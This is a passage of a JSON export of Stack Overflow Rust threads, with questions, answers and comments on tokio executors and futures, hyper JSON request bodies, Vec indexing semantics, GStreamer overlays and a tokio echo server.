"display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "edited": false, "score": 0, "creation_date": 1519373563, "post_id": 48940634, "comment_id": 84893870, "body": "Generally you wouldn&#39;t get one directly. They&#39;d be created behind the scenes by APIs like tokio&#39;s <code>current_thread</code>, e.g. <a href=\"https://tokio.rs/docs/getting-started/hello-world/#spawning\" rel=\"nofollow noreferrer\">tokio.rs/docs/getting-started/hello-world/#spawning</a>, or by the <code>core.run()</code> from my earlier example, or <code>.wait</code>, which creates one automatically: <a href=\"https://docs.rs/futures/0.1.18/src/futures/future/mod.rs.html#296\" rel=\"nofollow noreferrer\">docs.rs/futures/0.1.18/src/futures/future/mod.rs.html#296</a>"}, {"owner": {"reputation": 25893, "user_id": 353820, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/32b29e1dc23c2c5abe0283ab7b9541d3?s=128&d=identicon&r=PG", "display_name": "Doug", "link": "https://stackoverflow.com/users/353820/doug"}, "reply_to_user": {"reputation": 4594, "user_id": 1478356, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/996ee463b8f6b17a738f2e23f7ecfe9f?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1478356/stefan"}, "edited": false, "score": 0, "creation_date": 1519373673, "post_id": 48940634, "comment_id": 84893911, "body": "@Stefan <a href=\"https://github.com/tokio-rs/tokio-core#deprecation-notice\" rel=\"nofollow noreferrer\">github.com/tokio-rs/tokio-core#deprecation-notice</a> &quot;This crate is scheduled for deprecation in favor of tokio&quot;."}], "answers": [{"comments": [{"owner": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", "display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "edited": false, "score": 2, "creation_date": 1519374253, "post_id": 48943734, "comment_id": 84894146, "body": "It&#39;s good that you got your answer, but it&#39;s still not clear why this specific answer addressed your question, since <code>current_thread::run</code> will still block the main thread. Given your example code it&#39;s essentially identical to the <code>.wait</code> approach that you said you didn&#39;t want. Anyway, happy to end the discussion here."}, {"owner": {"reputation": 20746, "user_id": 1233251, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/cI9GF.png?s=128&g=1", "display_name": "E_net4 says don&#39;t copy that", "link": "https://stackoverflow.com/users/1233251/e-net4-says-dont-copy-that"}, "edited": false, "score": 3, "creation_date": 1519399112, "post_id": 48943734, "comment_id": 84908499, "body": "The Playground takes the 100 most downloaded crates from crates.io (documented <a href=\"https://play.rust-lang.org/help#features-crates\" rel=\"nofollow noreferrer\">here</a>). Since <code>tokio</code> has only been recently published to something usable, it hasn&#39;t reached enough popularity to be brought into the Playground."}], "tags": [], "owner": {"reputation": 25893, "user_id": 353820, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/32b29e1dc23c2c5abe0283ab7b9541d3?s=128&d=identicon&r=PG", "display_name": "Doug", "link": "https://stackoverflow.com/users/353820/doug"}, "is_accepted": true, "score": 2, "last_activity_date": 1519391633, "last_edit_date": 1519391633, "creation_date": 1519373754, "answer_id": 48943734, "question_id": 48940634, "link": "https://stackoverflow.com/questions/48940634/how-do-you-use-an-executor-to-resolve-a-future-in-rust/48943734#48943734", "title": "How do you use an executor to resolve a Future in rust?", "body": "<p>In general, <code>tokio</code> and <code>futures</code> are designed as async primitives, not as a generic task system.</p>\n\n<p>Which is to say, if you have multiple tasks you wish to dispatch asynchronously and 'fire and forget' them, use <code>thread::spawn</code>.</p>\n\n<p>If you have multiple tasks you want to run <em>in a single thread</em>, then <code>Future</code> is the right primitive to use to block in that thread until a chain of futures are resolved.</p>\n\n<p>In this case, my question didn't really make sense, because I thought that <code>Future</code> was supposed to represent something akin to <code>Task</code> in C#; that is, a dynamic dispatch to a threadpool for a task to be executes later, and the potential to chain actions to happen when that tasks resolved; with those tasks in turn to be executed in, potentially, different threads.</p>\n\n<p>This is not the model that <code>futures</code> and <code>tokio</code> support.</p>\n\n<p>However, I add here, just to irritate the nay-sayers, the answer to the actual question I asked:</p>\n\n<p>The answer is that <a href=\"https://docs.rs/tokio/0.1.1/tokio/index.html\" rel=\"nofollow noreferrer\">tokio</a> implements a number of basic <code>Executor</code>'s, including one for arbitrary tasks.</p>\n\n<p>see: <a href=\"https://docs.rs/tokio/0.1.1/tokio/executor/current_thread/struct.TaskExecutor.html\" rel=\"nofollow noreferrer\">https://docs.rs/tokio/0.1.1/tokio/executor/current_thread/struct.TaskExecutor.html</a></p>\n\n<p>specifically:\n<a href=\"https://docs.rs/tokio/0.1.1/tokio/executor/current_thread/index.html\" rel=\"nofollow noreferrer\">https://docs.rs/tokio/0.1.1/tokio/executor/current_thread/index.html</a></p>\n\n<p>You can use them like this:</p>\n\n<pre><code>extern crate futures;\nextern crate tokio;\n\nuse futures::Future;\nuse futures::future;\nuse futures::future::Executor;\nuse tokio::executor::current_thread;\nuse futures::sync::oneshot::{channel, Canceled};\nuse tokio::executor::current_thread::task_executor;\nuse std::thread;\nuse std::time::Duration;\nuse std::sync::mpsc::Sender;\nuse std::sync::mpsc;\nuse std::sync::{Arc, Mutex};\n\nstruct RemoteReactor {\n    channel: Sender&lt;Box&lt;Future&lt;Item=(), Error=()&gt; + Send + 'static&gt;&gt;\n}\n\nimpl RemoteReactor {\n    fn new() -&gt; RemoteReactor {\n        let (send, recv) = mpsc::channel::&lt;Box&lt;Future&lt;Item=(), Error=()&gt; + Send + 'static&gt;&gt;();\n        let threadsafe_recv = Arc::new(Mutex::new(recv));\n        thread::spawn(move || {\n            let reader = threadsafe_recv.lock().unwrap();\n            current_thread::run(|_| {\n                loop {\n                    let future = reader.recv().unwrap();\n                    println!(\"Got a future!\");\n                    task_executor().execute(future).unwrap();\n                    break;\n                }\n            });\n        });\n        return RemoteReactor {\n            channel: send\n        };\n    }\n\n    fn execute(&amp;self, future: Box&lt;Future&lt;Item=(), Error=()&gt; + Send + 'static&gt;) {\n        self.channel.send(future).unwrap();\n    }\n}\n\nfn maybe_oneday() -&gt; Box&lt;Future&lt;Item=i32, Error=Canceled&gt; + Send + 'static&gt; {\n    let (s, r) = channel::&lt;i32&gt;();\n    thread::spawn(move || {\n        thread::sleep(Duration::from_millis(100));\n        let _ = s.send(100);\n    });\n    return Box::new(r);\n}\n\nfn main() {\n    let foo = maybe_oneday();\n    let wrapper = Box::new(foo.then(|x| {\n        match x {\n            Ok(v) =&gt; {\n                println!(\"GOT: {:?}\", v);\n                future::ok::&lt;(), ()&gt;(())\n            }\n            Err(y) =&gt; {\n                println!(\"Err: {:?}\", y);\n                future::err::&lt;(), ()&gt;(())\n            }\n        }\n    }));\n\n    let reactor = RemoteReactor::new();\n    reactor.execute(wrapper);\n\n    println!(\"Waiting for future to resolve\");\n    thread::sleep(Duration::from_millis(200));\n\n    println!(\"All futures are probably resolved now\");\n}\n</code></pre>\n\n<p>NB. This code doesn't run on play.rust-lang.org (<code>error[E0463]: can't find crate for tokio</code>) for reasons I don't understand, but it does run rust 1.24:</p>\n\n<pre><code>rustc 1.24.0 (4d90ac38c 2018-02-12)\n\n$ cargo run\n    Finished dev [unoptimized + debuginfo] target(s) in 0.1 secs\n     Running `target\\debug\\hello_future.exe`\nWaiting for future to resolve\nGot a future!\nGOT: 100\nAll futures are probably resolved now\n</code></pre>\n"}], "owner": {"reputation": 25893, "user_id": 353820, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/32b29e1dc23c2c5abe0283ab7b9541d3?s=128&d=identicon&r=PG", "display_name": "Doug", "link": "https://stackoverflow.com/users/353820/doug"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1844, "favorite_count": 0, "accepted_answer_id": 48943734, "answer_count": 1, "score": 0, "last_activity_date": 1519391633, "creation_date": 1519356287, "question_id": 48940634, "link": "https://stackoverflow.com/questions/48940634/how-do-you-use-an-executor-to-resolve-a-future-in-rust", "title": "How do you use an executor to resolve a Future in rust?", "body": "<p>This code panics:</p>\n\n<pre><code>extern crate futures;\n\nuse futures::Future;\nuse futures::future;\nuse futures::sync::oneshot::{channel, Canceled};\nuse std::thread;\nuse std::time::Duration;\n\nfn maybe_oneday() -&gt; Box&lt;Future&lt;Item = i32, Error = Canceled&gt;&gt; {\n    let (s, r) = channel::&lt;i32&gt;();\n    thread::spawn(move || {\n        thread::sleep(Duration::from_millis(100));\n        let _ = s.send(100);\n    });\n    return Box::new(r);\n}\n\nfn main() {\n    let foo = maybe_oneday();\n    let mut wrapper = foo.then(|x| {\n        match x {\n            Ok(v) =&gt; {\n                println!(\"GOT: {:?}\", v);\n                future::ok::&lt;i32, Canceled&gt;(v)\n            },\n            Err(y) =&gt; {\n                println!(\"Err: {:?}\", y);\n               future::err::&lt;i32, Canceled&gt;(y)\n            }\n        }\n    });\n\n    // wrapper.wait() &lt;-- Works, but blocks\n    let _ = wrapper.poll(); // &lt;-- Panics\n}\n</code></pre>\n\n<p>With:</p>\n\n<pre><code>thread 'main' panicked at 'no Task is currently running', /checkout/src/libcore/option.rs:891:5\n</code></pre>\n\n<p>Presumably I have to use some kind of executor to delegate the task resolution to; but how?</p>\n\n<p>The documentation refers to <code>my_executor</code>, but <a href=\"https://docs.rs/futures/0.1.18/futures/future/trait.Executor.html#implementors\" rel=\"nofollow noreferrer\">there appear to be no implementations of this trait</a>, and the <a href=\"https://tokio.rs/docs/going-deeper-futures/tasks/\" rel=\"nofollow noreferrer\">find out more about executors</a> link is broken?</p>\n\n<p>Where do I get an executor from?</p>\n"}, {"tags": ["json", "rust", "client", "hyper"], "comments": [{"owner": {"reputation": 28990, "user_id": 1114966, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/af8712b05e5cfb862323a07c83749054?s=128&d=identicon&r=PG", "display_name": "squiguy", "link": "https://stackoverflow.com/users/1114966/squiguy"}, "edited": false, "score": 1, "creation_date": 1519341469, "post_id": 48936061, "comment_id": 84884583, "body": "I know this doesn&#39;t answer your question but there is <a href=\"https://docs.rs/reqwest\" rel=\"nofollow noreferrer\">reqwest</a> as well. It handles all of this for you."}], "answers": [{"tags": [], "owner": {"reputation": 313, "user_id": 7085243, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/1d9eb042d6fbc096ff6cbe4db83f16e5?s=128&d=identicon&r=PG&f=1", "display_name": "Sergey", "link": "https://stackoverflow.com/users/7085243/sergey"}, "is_accepted": true, "score": 1, "last_activity_date": 1519341104, "creation_date": 1519341104, "answer_id": 48938750, "question_id": 48936061, "link": "https://stackoverflow.com/questions/48936061/how-to-fix-the-trait-stdconvertfromserde-jsonvalue-is-not-implemented/48938750#48938750", "title": "How to fix the trait `std::convert::From&lt;serde_json::Value&gt;` is not implemented for `hyper::Body`?", "body": "<p>I fixed it by changing:</p>\n\n<pre><code>req.set_body(serde_json::to_vec(&amp;json).unwrap());\n</code></pre>\n\n<p>It works because there is:</p>\n\n<pre><code>impl From&lt;Vec&lt;u8&gt;&gt; for Body\n</code></pre>\n"}], "owner": {"reputation": 313, "user_id": 7085243, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/1d9eb042d6fbc096ff6cbe4db83f16e5?s=128&d=identicon&r=PG&f=1", "display_name": "Sergey", "link": "https://stackoverflow.com/users/7085243/sergey"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1170, "favorite_count": 0, "accepted_answer_id": 48938750, "answer_count": 1, "score": 4, "last_activity_date": 1519341104, "creation_date": 1519329110, "question_id": 48936061, "link": "https://stackoverflow.com/questions/48936061/how-to-fix-the-trait-stdconvertfromserde-jsonvalue-is-not-implemented", "title": "How to fix the trait `std::convert::From&lt;serde_json::Value&gt;` is not implemented for `hyper::Body`?", "body": "<p>I have a http-client building with <a href=\"https://hyper.rs/guides/client/basic/\" rel=\"nofollow noreferrer\">hyper</a>. And I try to send json data with method post:</p>\n\n<pre><code>fn run_client() {\n\n    let json = json!({\n                        \"list\": [\n                        {\n                          \"id\": 1,\n                          \"price\": 10,                                \n                        },\n                        {\n                          \"id\": 2,\n                          \"price\": 20,\n                        }]\n                    }\n    );\n\n    let mut core = Core::new().unwrap();\n    let client = Client::new(&amp;core.handle());\n\n    let uri = \"http://127.0.0.1:8888/add\".parse().unwrap();\n\n    let mut req = Request::new(Method::Post, uri);\n\n    req.headers_mut().set(ContentType::json());\n    req.set_body(json);\n\n    let post = client.request(req).and_then(|res| {\n        println!(\"POST: {}\", res.status());\n\n        res.body().concat2()\n    });\n\n    core.run(post).unwrap();\n}\n</code></pre>\n\n<p>But get error:</p>\n\n<pre><code>the trait `std::convert::From&lt;serde_json::Value&gt;` is not i mplemented for `hyper::Body`\n</code></pre>\n\n<p>How can I fix it and send <code>serde_json::Value</code> data with hyper-client?</p>\n"}, {"tags": ["rust"], "comments": [{"owner": {"reputation": 20746, "user_id": 1233251, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/cI9GF.png?s=128&g=1", "display_name": "E_net4 says don&#39;t copy that", "link": "https://stackoverflow.com/users/1233251/e-net4-says-dont-copy-that"}, "edited": false, "score": 2, "creation_date": 1519317416, "post_id": 48932388, "comment_id": 84872063, "body": "Side note: <a href=\"https://stackoverflow.com/q/40006219/1233251\">it is discouraged to accept <code>&amp;Vec&lt;_&gt;</code> and the like as a function argument</a>."}], "answers": [{"comments": [{"owner": {"reputation": 571, "user_id": 4493361, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh3.googleusercontent.com/-1j2w11MYwK8/AAAAAAAAAAI/AAAAAAAAAEM/cllVRT5KBFs/photo.jpg?sz=128", "display_name": "ccQpein", "link": "https://stackoverflow.com/users/4493361/ccqpein"}, "edited": false, "score": 0, "creation_date": 1519321038, "post_id": 48932794, "comment_id": 84874409, "body": "Thank you. It is interesting to learn rust."}, {"owner": {"reputation": 134258, "user_id": 785065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qAbxM.jpg?s=128&g=1", "display_name": "loganfsmyth", "link": "https://stackoverflow.com/users/785065/loganfsmyth"}, "edited": false, "score": 0, "creation_date": 1519326840, "post_id": 48932794, "comment_id": 84877548, "body": "Also worth mentioning that this allows <code>&amp;x[i]</code> to reference the value in the vector, since otherwise it&#39;d have to move the value out of the vector, and then take a reference to the moved value which would be unworkable."}, {"owner": {"reputation": 249985, "user_id": 147192, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/E78Vj.png?s=128&g=1", "display_name": "Matthieu M.", "link": "https://stackoverflow.com/users/147192/matthieu-m"}, "reply_to_user": {"reputation": 571, "user_id": 4493361, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh3.googleusercontent.com/-1j2w11MYwK8/AAAAAAAAAAI/AAAAAAAAAEM/cllVRT5KBFs/photo.jpg?sz=128", "display_name": "ccQpein", "link": "https://stackoverflow.com/users/4493361/ccqpein"}, "edited": false, "score": 1, "creation_date": 1519404349, "post_id": 48932794, "comment_id": 84911831, "body": "@ccQpein: To be honest, this is a dirty hack really. The problem is that you would really like to be able to parameterize the <code>Output</code> associated type of <code>Index</code> by a lifetime, allowing the user to decide whether to return a reference or not, but this is not yet possible. Therefore, for ergonomics reasons, we have this weird hack in place. As you may have guessed, I am not a fan :x"}, {"owner": {"reputation": 20746, "user_id": 1233251, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/cI9GF.png?s=128&g=1", "display_name": "E_net4 says don&#39;t copy that", "link": "https://stackoverflow.com/users/1233251/e-net4-says-dont-copy-that"}, "reply_to_user": {"reputation": 249985, "user_id": 147192, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/E78Vj.png?s=128&g=1", "display_name": "Matthieu M.", "link": "https://stackoverflow.com/users/147192/matthieu-m"}, "edited": false, "score": 0, "creation_date": 1519405090, "post_id": 48932794, "comment_id": 84912256, "body": "@MatthieuM. I suppose you meant to ping @loganfsmyth?"}, {"owner": {"reputation": 249985, "user_id": 147192, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/E78Vj.png?s=128&g=1", "display_name": "Matthieu M.", "link": "https://stackoverflow.com/users/147192/matthieu-m"}, "edited": false, "score": 0, "creation_date": 1519405599, "post_id": 48932794, "comment_id": 84912561, "body": "@E_net4: No, I meant to ping the OP :) I don&#39;t find this hack &quot;interesting&quot;, it&#39;s a wart to me."}], "tags": [], "owner": {"reputation": 20746, "user_id": 1233251, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/cI9GF.png?s=128&g=1", "display_name": "E_net4 says don&#39;t copy that", "link": "https://stackoverflow.com/users/1233251/e-net4-says-dont-copy-that"}, "is_accepted": true, "score": 8, "last_activity_date": 1519405081, "last_edit_date": 1519405081, "creation_date": 1519317743, "answer_id": 48932794, "question_id": 48932388, "link": "https://stackoverflow.com/questions/48932388/about-trait-index-implement-of-vector-in-rust/48932794#48932794", "title": "About trait Index implement of Vector in Rust", "body": "<p>There was a small misguidance here. Although the method prototype for <a href=\"https://doc.rust-lang.org/stable/std/ops/trait.Index.html\" rel=\"nofollow noreferrer\"><code>Index&lt;Idx&gt;</code></a> is <code>fn index(&amp;self, index: Idx) -&gt; &amp;T</code>, the syntactical operator <code>x[i]</code> <em>does</em> dereference the output from that <code>&amp;T</code>:</p>\n\n<blockquote>\n  <p><code>container[index]</code> is actually syntactic sugar for <code>*container.index(index)</code> [...]. This allows nice things such as <code>let value = v[index]</code> if the type of <code>value</code> implements <code>Copy</code>.</p>\n</blockquote>\n\n<p>So there you go. Your function is indeed returning a copy of the value from the vector, but not from an implicit conversion. If the original intent was to really retrieve a reference to that value, you would do <code>&amp;x[i]</code>.</p>\n\n<p>See also:</p>\n\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/36335342/meaning-of-the-ampersand-and-star-symbols-in-rust\">Meaning of the ampersand &#39;&amp;&#39; and star &#39;*&#39; symbols in Rust</a></li>\n<li><a href=\"https://stackoverflow.com/questions/29216530/does-rust-automatically-dereference-primitive-type-references\">Does Rust automatically dereference primitive type references?</a></li>\n</ul>\n"}], "owner": {"reputation": 571, "user_id": 4493361, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh3.googleusercontent.com/-1j2w11MYwK8/AAAAAAAAAAI/AAAAAAAAAEM/cllVRT5KBFs/photo.jpg?sz=128", "display_name": "ccQpein", "link": "https://stackoverflow.com/users/4493361/ccqpein"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 173, "favorite_count": 0, "closed_date": 1519494521, "accepted_answer_id": 48932794, "answer_count": 1, "score": 2, "last_activity_date": 1519405081, "creation_date": 1519316607, "last_edit_date": 1519316913, "question_id": 48932388, "link": "https://stackoverflow.com/questions/48932388/about-trait-index-implement-of-vector-in-rust", "closed_reason": "Duplicate", "title": "About trait Index implement of Vector in Rust", "body": "<p>I check Index trait in doc and find return type of <code>index()</code> is <code>&amp;T</code>. </p>\n\n<p>Then I write this function to get value from vector:</p>\n\n<pre><code>fn get_value_test(a: usize, v: &amp;Vec&lt;i32&gt;) -&gt; i32 {\n    v[a]\n}\n</code></pre>\n\n<p>My question is: why <code>v[a]</code> is <code>i32</code> but <code>&amp;i32</code>? Because <code>i32</code> <code>...have a known size at compile time are stored entirely on the stack, so copies of the actual values are quick to make</code>? (from <a href=\"https://doc.rust-lang.org/book/second-edition/ch04-01-what-is-ownership.html\" rel=\"nofollow noreferrer\">here</a>)</p>\n\n<p>It looks like Rust have hidden rule to convert type in this situation?</p>\n"}, {"tags": ["video", "rust", "video-streaming", "gstreamer", "video-processing"], "answers": [{"comments": [{"owner": {"reputation": 311, "user_id": 8070904, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c2e2cc3ccbae5a59a2ddf4df942d1835?s=128&d=identicon&r=PG&f=1", "display_name": "chocol4te", "link": "https://stackoverflow.com/users/8070904/chocol4te"}, "edited": false, "score": 0, "creation_date": 1519319838, "post_id": 48933476, "comment_id": 84873657, "body": "Thank you so much for your detailed answer, it is really helpful! :)"}, {"owner": {"reputation": 1771, "user_id": 3040948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2e165e48a46079440f8ae438b0a3ed88?s=128&d=identicon&r=PG", "display_name": "Sebastian Dr&#246;ge", "link": "https://stackoverflow.com/users/3040948/sebastian-dr%c3%b6ge"}, "reply_to_user": {"reputation": 311, "user_id": 8070904, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c2e2cc3ccbae5a59a2ddf4df942d1835?s=128&d=identicon&r=PG&f=1", "display_name": "chocol4te", "link": "https://stackoverflow.com/users/8070904/chocol4te"}, "edited": false, "score": 0, "creation_date": 1519368601, "post_id": 48933476, "comment_id": 84891815, "body": "No problem, let me know if you have any further questions :)"}], "tags": [], "owner": {"reputation": 1771, "user_id": 3040948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2e165e48a46079440f8ae438b0a3ed88?s=128&d=identicon&r=PG", "display_name": "Sebastian Dr&#246;ge", "link": "https://stackoverflow.com/users/3040948/sebastian-dr%c3%b6ge"}, "is_accepted": true, "score": 3, "last_activity_date": 1519319669, "creation_date": 1519319669, "answer_id": 48933476, "question_id": 48932092, "link": "https://stackoverflow.com/questions/48932092/lowest-overhead-source-format-for-gstreamer/48933476#48933476", "title": "Lowest overhead source format for GStreamer?", "body": "<p>There are multiple options here for you, depending on how you want to generate the overlay. I wouldn't recommend going via MJPEG or anything else but just work on raw video. This is quite convenient with the Rust GStreamer bindings and has basically the lowest possible overhead.</p>\n\n<p>1) Generate a overlay raw video stream, each frame being fully transparent where there is no overlay. This can be done similar to the appsrc example from the Rust GStreamer bindings <a href=\"https://github.com/sdroege/gstreamer-rs/blob/master/examples/src/bin/appsrc.rs\" rel=\"nofollow noreferrer\">here</a></p>\n\n<p>You could then pass that to the compositor element (or glvideomixer or other mixer elements using some hardware API), which could composite your normal video stream and the overlay stream.</p>\n\n<p>For generating the overlay you could use any API you want that can render text, etc on top of ARGB (or any other raw video format). One option would be Cairo, which also has Rust bindings.</p>\n\n<p>It has the disadvantage over the next solution that you have to generate full video frames, the compositor has to generate yet another video frame for each frame. A lot of copying will have to happen.</p>\n\n<p>2) You could write a GStreamer element in Rust does acts as a video filter and paints the overlay over the video frames. There is an example video filter <a href=\"https://github.com/sdroege/gst-plugin-rs/blob/master/gst-plugin-tutorial/src/rgb2gray.rs\" rel=\"nofollow noreferrer\">here</a> and I wrote an article explaining each part <a href=\"https://coaxion.net/blog/2018/01/how-to-write-gstreamer-elements-in-rust-part-1-a-video-filter-for-converting-rgb-to-grayscale/\" rel=\"nofollow noreferrer\">here</a></p>\n\n<p>You don't have to do all the plugin initialization stuff in src/lib.rs but could have only the equivalent of the source file of the RGB2Gray converter inside your application and call the register function somewhere at the beginning of your code.</p>\n\n<p>The video filter itself would also be a bit simpler as input and output format would be the same.</p>\n\n<p>For generating the overlay you could use any API you want that can render text, etc on top of ARGB (or any other raw video format). One option would be Cairo, which also has Rust bindings.</p>\n\n<p>Apart from potentially needed video format conversion (if the input video has a different format than what you support for drawing on top of it), this would be the most efficient approach.</p>\n\n<p>3) Make use of the <a href=\"https://gstreamer.freedesktop.org/data/doc/gstreamer/head/gst-plugins-good-plugins/html/gst-plugins-good-plugins-cairooverlay.html\" rel=\"nofollow noreferrer\">cairooverlay</a> GStreamer element. It basically works like 2) and gives you directly a Cairo context that you can then use for drawing whatever you want on top of the video frame. You get a signal with a Cairo context (the \"draw\" signal) for every frame that passes through the element.</p>\n\n<p>But you have to use the Cairo API then, and you might have to add some API extensions to the Rust Cairo bindings. I'm not 100% sure if everything needed is already available.</p>\n"}], "owner": {"reputation": 311, "user_id": 8070904, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c2e2cc3ccbae5a59a2ddf4df942d1835?s=128&d=identicon&r=PG&f=1", "display_name": "chocol4te", "link": "https://stackoverflow.com/users/8070904/chocol4te"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 177, "favorite_count": 1, "accepted_answer_id": 48933476, "answer_count": 1, "score": 1, "last_activity_date": 1519319669, "creation_date": 1519315787, "last_edit_date": 1519316004, "question_id": 48932092, "link": "https://stackoverflow.com/questions/48932092/lowest-overhead-source-format-for-gstreamer", "title": "Lowest overhead source format for GStreamer?", "body": "<p>I need to generate a live overlay in Rust for use as a GStreamer source.</p>\n\n<p>I have a few mutable variables; an array of strings and some sensor data that need to be overlayed on a 1080p60 video stream.</p>\n\n<p>Is generating a raw stream best, or encoding to MJPG first? What method has the least total overhead between the Rust application and GStreamer?</p>\n"}, {"tags": ["rust", "future", "rust-tokio"], "comments": [{"owner": {"reputation": 20746, "user_id": 1233251, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/cI9GF.png?s=128&g=1", "display_name": "E_net4 says don&#39;t copy that", "link": "https://stackoverflow.com/users/1233251/e-net4-says-dont-copy-that"}, "edited": false, "score": 3, "creation_date": 1519304158, "post_id": 48927743, "comment_id": 84862038, "body": "I&#39;m pretty sure that the compiler doesn&#39;t spit out just &quot;ERROR&quot;. Please include the full error message."}, {"owner": {"reputation": 604, "user_id": 3884974, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/a1f5eca7d4c975bd4ad5886c04a942fc?s=128&d=identicon&r=PG", "display_name": "Adri&#225;n Arroyo Calle", "link": "https://stackoverflow.com/users/3884974/adri%c3%a1n-arroyo-calle"}, "reply_to_user": {"reputation": 20746, "user_id": 1233251, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/cI9GF.png?s=128&g=1", "display_name": "E_net4 says don&#39;t copy that", "link": "https://stackoverflow.com/users/1233251/e-net4-says-dont-copy-that"}, "edited": false, "score": 0, "creation_date": 1519304723, "post_id": 48927743, "comment_id": 84862473, "body": "Error code: std::rc::Rc&lt;futures::stream::SplitSink&lt;tokio_io::codec::Fram&zwnj;&#8203;ed&lt;tokio::net::TcpSt&zwnj;&#8203;ream, tokio_io::codec::LinesCodec&gt;&gt;&gt;` cannot be shared between threads safely"}, {"owner": {"reputation": 604, "user_id": 3884974, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/a1f5eca7d4c975bd4ad5886c04a942fc?s=128&d=identicon&r=PG", "display_name": "Adri&#225;n Arroyo Calle", "link": "https://stackoverflow.com/users/3884974/adri%c3%a1n-arroyo-calle"}, "reply_to_user": {"reputation": 20746, "user_id": 1233251, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/cI9GF.png?s=128&g=1", "display_name": "E_net4 says don&#39;t copy that", "link": "https://stackoverflow.com/users/1233251/e-net4-says-dont-copy-that"}, "edited": false, "score": 0, "creation_date": 1519304778, "post_id": 48927743, "comment_id": 84862514, "body": "However, using Arc doesn&#39;t solve the problem: writer.send(line); - ^^^^^^ cannot move out of borrowed content"}, {"owner": {"reputation": 25137, "user_id": 4498831, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/jDBV2.png?s=128&g=1", "display_name": "Boiethios", "link": "https://stackoverflow.com/users/4498831/boiethios"}, "edited": false, "score": 3, "creation_date": 1519305245, "post_id": 48927743, "comment_id": 84862891, "body": "Please edit your question and add the error message and other information. Don&#39;t do this in the comments."}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519498075, "post_id": 48927743, "comment_id": 84938442, "body": "<i>I&#39;m trying to build an echo server [...] I want to modify the output</i> \u2014 modifying the input seems to be the exact opposite of what an echo server would do."}], "answers": [{"tags": [], "owner": {"reputation": 604, "user_id": 3884974, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/a1f5eca7d4c975bd4ad5886c04a942fc?s=128&d=identicon&r=PG", "display_name": "Adri&#225;n Arroyo Calle", "link": "https://stackoverflow.com/users/3884974/adri%c3%a1n-arroyo-calle"}, "is_accepted": true, "score": 1, "last_activity_date": 1519771036, "creation_date": 1519771036, "answer_id": 49019099, "question_id": 48927743, "link": "https://stackoverflow.com/questions/48927743/tokio-echo-server-cannot-read-and-write-in-the-same-future/49019099#49019099", "title": "Tokio echo server. Cannot read and write in the same future", "body": "<p>I finally found that <code>forward</code> was the answer to my question.</p>\n\n<pre><code>extern crate tokio;\nextern crate tokio_io;\nextern crate futures;\n\nuse futures::prelude::*;\nuse tokio_io::AsyncRead;\nuse futures::Stream;\nuse tokio_io::codec::*;\n\n\nstruct Cancellable{\n    rx: std::sync::mpsc::Receiver&lt;()&gt;,\n}\n\nimpl Future for Cancellable {\n    type Item = ();\n    type Error = std::sync::mpsc::RecvError;\n\n    fn poll(&amp;mut self) -&gt; Result&lt;Async&lt;Self::Item&gt;,Self::Error&gt; {\n        match self.rx.try_recv() {\n            Ok(_) =&gt; Ok(Async::Ready(())),\n            Err(_) =&gt; Ok(Async::NotReady)\n        }\n    }\n}\n\nfn main() {\n    use std::net::*;\n    let socket = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)), 8080);\n    let listener = tokio::net::TcpListener::bind(&amp;socket).unwrap();\n    let server = listener.incoming().for_each(|socket|{\n        let (writer,reader) = socket.framed(LinesCodec::new()).split();\n        let (tx,rx) = 